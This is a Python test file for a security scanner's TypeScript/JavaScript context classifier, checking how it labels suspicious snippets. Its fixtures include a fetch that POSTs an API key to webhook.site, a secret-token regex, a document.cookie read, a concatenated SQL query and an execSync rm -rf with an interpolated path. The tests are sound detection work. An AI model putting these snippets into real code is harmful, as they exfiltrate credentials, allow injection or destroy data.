#!/usr/bin/env python3
"""Regression locks for scripts/_skillaudit_typescript_context.py (issue #39).

The classifier returns safe_literal / safe_doc / suspect / unknown
verdicts for TS/JS source files. These tests pin every documented
verdict on every input shape the classifier handles, including the
iron-rule preservation: real exploits are NEVER downgraded.

The classifier is line-window regex-based (no full TS parser) so its
guarantees are weaker than the Python AST classifier. The tests
therefore verify that it conservatively returns "unknown" for any
input shape not explicitly in its allow-list — letting the existing
heuristic chain decide.
"""

from __future__ import annotations

import sys
from pathlib import Path

REPO = Path(__file__).parent.parent
SCRIPTS_DIR = REPO / "scripts"
if str(SCRIPTS_DIR) not in sys.path:
    sys.path.insert(0, str(SCRIPTS_DIR))


def _line_idx_of(src: str, needle: str) -> int:
    """Return the 0-based line index where ``needle`` first appears."""
    offset = src.index(needle)
    return src.count("\n", 0, offset)


# ────────────────────────────────────────────────────────────────────────
# TestIsTestFile — test-file path-pattern recognition
# ────────────────────────────────────────────────────────────────────────


class TestIsTestFile:
    def test_dot_test_ts(self) -> None:
        import _skillaudit_typescript_context as ctx

        assert ctx._is_test_file("src/foo.test.ts")
        assert ctx._is_test_file("src/foo.test.tsx")

    def test_dot_spec_js(self) -> None:
        import _skillaudit_typescript_context as ctx

        assert ctx._is_test_file("src/foo.spec.js")
        assert ctx._is_test_file("src/foo.spec.mjs")

    def test_tests_dir(self) -> None:
        import _skillaudit_typescript_context as ctx

        assert ctx._is_test_file("tests/foo.ts")
        assert ctx._is_test_file("test/foo.ts")

    def test_underscore_underscore_tests_dir(self) -> None:
        import _skillaudit_typescript_context as ctx

        assert ctx._is_test_file("src/__tests__/foo.ts")

    def test_fixtures_dir(self) -> None:
        import _skillaudit_typescript_context as ctx

        assert ctx._is_test_file("src/fixtures/data.ts")
        assert ctx._is_test_file("src/__fixtures__/data.ts")

    def test_production_file_not_test(self) -> None:
        import _skillaudit_typescript_context as ctx

        assert not ctx._is_test_file("src/cli.ts")
        assert not ctx._is_test_file("src/index.ts")
        assert not ctx._is_test_file("src/mass_scouting/cli.ts")


# ────────────────────────────────────────────────────────────────────────
# TestCredEnvRead — safe_literal on own-API-key reads
# ────────────────────────────────────────────────────────────────────────


class TestCredEnvReadVerdicts:
    def test_known_own_key_no_sink_safe(self) -> None:
        import _skillaudit_typescript_context as ctx

        src = "const k = process.env.OPENROUTER_API_KEY;\nconsole.log('Loaded');\n"
        v = ctx.classify("src/cli.ts", src, 0, "process.env.OPENROUTER_API_KEY", "CRED_ENV_READ")
        assert v == "safe_literal"

    def test_known_own_key_with_official_api_sink_safe(self) -> None:
        """Reading the key + calling its OWN provider's API is safe."""
        import _skillaudit_typescript_context as ctx

        src = (
            "const k = process.env.OPENROUTER_API_KEY;\n"
            'await fetch("https://openrouter.ai/api/v1/chat", { headers: { Authorization: `Bearer ${k}` } });\n'
        )
        v = ctx.classify("src/api.ts", src, 0, "process.env.OPENROUTER_API_KEY", "CRED_ENV_READ")
        assert v == "safe_literal"

    def test_known_own_key_with_webhook_sink_suspect(self) -> None:
        """Reading the key + sending it to webhook.site is suspect."""
        import _skillaudit_typescript_context as ctx

        src = (
            "const k = process.env.OPENROUTER_API_KEY;\n"
            'await fetch("https://webhook.site/abc", { method: "POST", body: k });\n'
        )
        v = ctx.classify("src/leak.ts", src, 0, "process.env.OPENROUTER_API_KEY", "CRED_ENV_READ")
        assert v == "suspect"

    def test_unknown_env_var_returns_unknown(self) -> None:
        """A non-own-API-key env read returns unknown so heuristic chain runs."""
        import _skillaudit_typescript_context as ctx

        src = "const x = process.env.MY_CUSTOM_VAR;\n"
        v = ctx.classify("src/x.ts", src, 0, "process.env.MY_CUSTOM_VAR", "CRED_ENV_READ")
        assert v == "unknown"

    def test_claude_plugin_option_prefix_safe(self) -> None:
        """CLAUDE_PLUGIN_OPTION_* is plugin-system bridge → safe."""
        import _skillaudit_typescript_context as ctx

        src = "const k = process.env.CLAUDE_PLUGIN_OPTION_OPENROUTER_API_KEY;\n"
        v = ctx.classify("src/bridge.ts", src, 0, "process.env.CLAUDE_PLUGIN_OPTION_OPENROUTER_API_KEY", "CRED_ENV_READ")
        assert v == "safe_literal"


# ────────────────────────────────────────────────────────────────────────
# TestTokenSteal — regex-literal redaction allow-list recognition
# ────────────────────────────────────────────────────────────────────────


class TestTokenStealVerdicts:
    def test_regex_alternation_of_secret_names_safe(self) -> None:
        import _skillaudit_typescript_context as ctx

        line = "const SECRETS = /OPENAI_API_KEY|GITHUB_TOKEN|DISCORD_TOKEN/gim;"
        src = line + "\n"
        v = ctx.classify("src/redact.ts", src, 0, "DISCORD_TOKEN", "TOKEN_STEAL")
        assert v == "safe_literal"

    def test_single_target_regex_not_safe(self) -> None:
        """A single-target regex (no alternation) is NOT recognised as
        a redaction allow-list — could be a single-target attack regex."""
        import _skillaudit_typescript_context as ctx

        line = "const D = /DISCORD_TOKEN=([a-z0-9]+)/i;"
        src = line + "\n"
        v = ctx.classify("src/x.ts", src, 0, "DISCORD_TOKEN", "TOKEN_STEAL")
        assert v == "unknown"

    def test_bare_document_cookie_access_unknown(self) -> None:
        import _skillaudit_typescript_context as ctx

        src = "const tok = document.cookie;\n"
        v = ctx.classify("src/x.ts", src, 0, "document.cookie", "TOKEN_STEAL")
        assert v == "unknown"


# ────────────────────────────────────────────────────────────────────────
# TestSyntheticSecret — fake-secret recognition in test files
# ────────────────────────────────────────────────────────────────────────


class TestSyntheticSecretVerdicts:
    def test_sk_repeated_char_in_test_file_safe(self) -> None:
        import _skillaudit_typescript_context as ctx

        src = 'const fake = "sk-aaaaaaaaaaaaaaaaaaaaaaaaaaa";\n'
        v = ctx.classify(
            "src/foo.test.ts", src, 0, "sk-aaaaaaaaaaaaaaaaaaaaaaaaaaa", "SECRET_OPENAI_KEY"
        )
        assert v == "safe_literal"

    def test_sk_repeated_char_in_production_unknown(self) -> None:
        import _skillaudit_typescript_context as ctx

        src = 'const fake = "sk-aaaaaaaaaaaaaaaaaaaaaaaaaaa";\n'
        v = ctx.classify(
            "src/auth.ts", src, 0, "sk-aaaaaaaaaaaaaaaaaaaaaaaaaaa", "SECRET_OPENAI_KEY"
        )
        assert v == "unknown"

    def test_sk_proj_obvious_placeholder_in_test_safe(self) -> None:
        import _skillaudit_typescript_context as ctx

        src = 'const k = "sk-proj-1234567890abcdef1234567890abcdef";\n'
        v = ctx.classify(
            "src/foo.test.ts", src, 0, "sk-proj-1234567890abcdef1234567890abcdef", "SECRET_OPENAI_KEY"
        )
        assert v == "safe_literal"

    def test_real_looking_sk_proj_in_test_unknown(self) -> None:
        """A real-looking sk-proj key inside a test file stays unknown.
        Test files CAN accidentally leak real secrets — only the
        obviously-fake shape is recognised."""
        import _skillaudit_typescript_context as ctx

        src = 'const k = "sk-proj-AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTt";\n'
        v = ctx.classify(
            "src/foo.test.ts",
            src,
            0,
            "sk-proj-AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTt",
            "SECRET_OPENAI_KEY",
        )
        assert v == "unknown"


# ────────────────────────────────────────────────────────────────────────
# TestSqlInjection — sample-doc string-array data in TS tests
# ────────────────────────────────────────────────────────────────────────


class TestSqlInjectionVerdicts:
    def test_sql_in_test_file_with_writefilesync_nearby_safe(self) -> None:
        import _skillaudit_typescript_context as ctx

        src = (
            "it('flags deprecated', () => {\n"
            "  writeFileSync(file, [\n"
            "    'const users = db.query(\"SELECT * FROM users WHERE id = \" + userId);',\n"
            "  ].join('\\n'));\n"
            "});\n"
        )
        idx = _line_idx_of(src, "db.query")
        v = ctx.classify(
            "src/x.test.ts", src, idx, "db.query(\"SELECT", "SQL_INJECTION"
        )
        assert v == "safe_literal"

    def test_sql_in_production_unknown(self) -> None:
        import _skillaudit_typescript_context as ctx

        src = (
            "async function q(id: string) {\n"
            "  return db.query('SELECT * FROM users WHERE id = ' + id);\n"
            "}\n"
        )
        idx = _line_idx_of(src, "db.query")
        v = ctx.classify(
            "src/users.ts", src, idx, "db.query('SELECT", "SQL_INJECTION"
        )
        assert v == "unknown"


# ────────────────────────────────────────────────────────────────────────
# TestUnsupportedRules — classifier returns unknown for unknown rule_ids
# ────────────────────────────────────────────────────────────────────────


class TestUnsupportedRules:
    """The classifier deliberately only handles a small set of TS/JS
    rule shapes. Every other rule_id falls through to unknown so the
    existing heuristic chain runs."""

    def test_unknown_rule_id_returns_unknown(self) -> None:
        import _skillaudit_typescript_context as ctx

        src = "const x = 1;\n"
        v = ctx.classify("src/x.ts", src, 0, "x", "SOME_FUTURE_RULE")
        assert v == "unknown"

    def test_cmd_injection_in_ts_returns_unknown(self) -> None:
        """CMD_INJECTION isn't a TS-classifier rule — JS shell exec
        goes through the heuristic chain (no AST parser here)."""
        import _skillaudit_typescript_context as ctx

        src = "execSync(`rm -rf ${path}`);\n"
        v = ctx.classify("src/x.ts", src, 0, "execSync", "CMD_INJECTION")
        assert v == "unknown"
